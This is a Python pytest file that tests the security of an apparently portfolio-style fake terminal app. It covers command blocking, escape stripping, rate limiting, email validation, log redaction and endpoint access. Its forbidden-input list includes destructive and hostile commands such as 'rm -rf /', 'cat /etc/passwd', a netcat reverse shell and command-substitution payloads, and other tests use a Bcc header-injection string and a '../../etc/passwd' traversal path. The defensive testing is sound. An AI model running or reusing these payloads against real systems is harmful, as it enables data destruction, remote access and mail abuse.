import json
import pathlib
import re
import subprocess

import pytest
from fastapi.testclient import TestClient

from app.security import audit
from app.security.rate_limit import SlidingWindowLimiter
from app.security.validation import ContactValidationError, detect_spam, validate_contact, validate_email
from app.terminal.renderer import PlainRenderer, SSHRenderer, WebRenderer, L

FORBIDDEN_INPUTS = ["rm -rf /", "bash", "sh", "zsh", "fish", "sudo", "sudo rm -rf /", "cat /etc/passwd",
                    "python", "python3", "curl http://example.com", "wget http://example.com", "ls", "ls -la",
                    "cd /", "pwd", "touch x", "mkdir x", "rm x", "echo $(id)", "`id`", "; id", "id && whoami",
                    "ssh evil", "nc -e /bin/sh 1.1.1.1 4444"]


@pytest.mark.parametrize("line", FORBIDDEN_INPUTS)
async def test_shell_commands_never_execute(core, state, monkeypatch, line):
    def boom(*a, **k):
        raise AssertionError("OS command execution attempted")
    monkeypatch.setattr(subprocess, "Popen", boom)
    monkeypatch.setattr("os.system", boom)
    monkeypatch.setattr("os.popen", boom)
    result = await core.handle_line(state, line)
    text = PlainRenderer().render(result.lines)
    assert "not a Linux shell" in text or "Input" in text or "Command not found" in text
    assert "root:" not in text and "uid=" not in text


def test_public_runner_refuses_non_public_commands(core):
    for line in ("rm -rf /", "contact", "exit", "history", "clear", "bash"):
        assert not core.run_public(line).ok


def test_source_never_spawns_processes():
    root = pathlib.Path(__file__).resolve().parents[1] / "app"
    pattern = re.compile(r"\bsubprocess\b|os\.system|os\.popen|shell\s*=\s*True|\bpty\.spawn|\bexec[lv]p?e?\(|create_subprocess")
    offenders = [str(p) for p in root.rglob("*.py")
                 if pattern.search("\n".join(l for l in p.read_text().splitlines() if not l.lstrip().startswith(("#", '"""'))))]
    # docstrings mention the words "subprocess"/"os.system" to document the ban; strip them first
    offenders = [o for o in offenders if re.search(pattern, re.sub(r'""".*?"""', "", pathlib.Path(o).read_text(), flags=re.S))]
    assert offenders == []


def test_escape_sequences_are_stripped_in_every_renderer():
    line = L("hello \x1b[31mred\x1b[0m \x07 bell \x9b31m")
    assert "\x1b" not in PlainRenderer().render([line])
    assert "\x1b[31m" not in SSHRenderer().render([line])
    assert "\x1b" not in json.dumps(WebRenderer().render([line])).replace("\\u001b", "\x1b")


def test_unknown_command_echo_is_sanitised_and_truncated(core, state):
    import asyncio
    result = asyncio.run(core.handle_line(state, "x" * 100))
    assert "Command not found: " + "x" * 40 in PlainRenderer().render(result.lines)
    assert "x" * 41 not in PlainRenderer().render(result.lines)


def test_rate_limiter_window():
    now = [0.0]
    lim = SlidingWindowLimiter(3, 3600, clock=lambda: now[0])
    assert [lim.allow("ip") for _ in range(4)] == [True, True, True, False]
    assert lim.allow("other") and lim.retry_after("ip") == 3600
    now[0] = 3601
    assert lim.allow("ip")


def test_rate_limiter_release():
    lim = SlidingWindowLimiter(1, 60)
    assert lim.allow("a") and not lim.allow("a")
    lim.release("a")
    assert lim.allow("a")


def test_email_validation(settings):
    for ok in ("a@b.co", "first.last+tag@sub.example.org"):
        assert validate_email(ok, settings) == ok
    for bad in ("", "a", "a@b", "a b@c.co", "a@b..co", "a@@b.co", "a@b.co\nBcc: x@y.z", "@b.co", "a" * 65 + "@b.co"):
        with pytest.raises(Exception):
            validate_email(bad, settings)


def test_contact_validation_collects_all_errors(settings):
    with pytest.raises(ContactValidationError) as exc:
        validate_contact("", "bad", "", settings)
    assert set(exc.value.errors) == {"name", "email", "message"}


def test_header_injection_blocked(settings):
    # newlines in the name are collapsed, so they can never reach a mail header
    assert "\n" not in validate_contact("Ada\r\nBcc: evil@x.co", "a@b.co", "hi", settings).name
    with pytest.raises(ContactValidationError):
        validate_contact("Ada", "a@b.co\nBcc: evil@x.co", "hi", settings)


def test_spam_heuristics(settings):
    clean = lambda m: validate_contact("Ada", "a@b.co", m, settings)
    assert detect_spam(clean("Hello, I liked your SmartGallery project.")) is None
    assert detect_spam(clean("see http://a.co http://b.co http://c.co")) == "too_many_links"
    assert detect_spam(clean("cheap viagra here")) == "spam_phrase"
    assert detect_spam(clean("a" * 30)) == "repeated_characters"
    assert detect_spam(clean("PLEASE REPLY TO MY MESSAGE ABOUT YOUR AMAZING PROJECT NOW")) == "shouting"


def test_audit_never_logs_sensitive_fields(capsys):
    audit.configure_logging("INFO")
    payload = audit.log_event("contact_sent", email="a@b.co", message="secret body", password="p", token="t",
                              cookie="c", smtp_password="s", name="Ada", remote_ip="1.2.3.4", transport="ssh")
    assert set(payload) == {"timestamp", "event", "remote_ip", "transport"}
    out = capsys.readouterr().out
    assert "secret body" not in out and "a@b.co" not in out


async def test_command_audit_has_required_fields(core, state):
    seen = []
    core._log = lambda event, **f: seen.append((event, f))
    await core.handle_line(state, "about")
    event, fields = seen[-1]
    assert event == "command" and {"connection_id", "transport", "remote_ip", "command", "duration_ms"} <= set(fields)


def test_contact_flow_inputs_are_not_logged_or_in_history(core, state):
    import asyncio
    seen = []
    core._log = lambda event, **f: seen.append(json.dumps(f))
    for line in ("contact", "Ada", "ada@example.com", "my private message"):
        asyncio.run(core.handle_line(state, line))
    joined = " ".join(seen)
    assert "ada@example.com" not in joined and "my private message" not in joined
    assert state.history == ["contact"]


def test_curl_endpoints(app):
    c = TestClient(app)
    for path, needle in (("/terminal/about", "ABOUT"), ("/terminal/projects", "signBridge"),
                         ("/terminal/skills", "SKILLS"), ("/terminal/resume", "drive.google.com"),
                         ("/terminal/project/NeuralDrive", "NEURALDRIVE"), ("/terminal/", "Available commands")):
        r = c.get(path)
        assert r.status_code == 200 and needle in r.text and r.headers["content-type"].startswith("text/plain")
        assert "\x1b" not in r.text
    for path in ("/terminal/rm", "/terminal/bash", "/terminal/contact", "/terminal/project/../../etc/passwd"):
        assert c.get(path).status_code == 404


def test_curl_rate_limited(app):
    c = TestClient(app)
    codes = [c.get("/terminal/help").status_code for _ in range(65)]
    assert 429 in codes


def test_forwarded_for_ignored_unless_trusted(app):
    from app.main import client_ip
    from starlette.requests import Request
    scope = {"type": "http", "headers": [(b"x-forwarded-for", b"6.6.6.6")], "client": ("10.0.0.1", 1)}
    assert client_ip(Request(scope), False) == "10.0.0.1"
    assert client_ip(Request(scope), True) == "6.6.6.6"
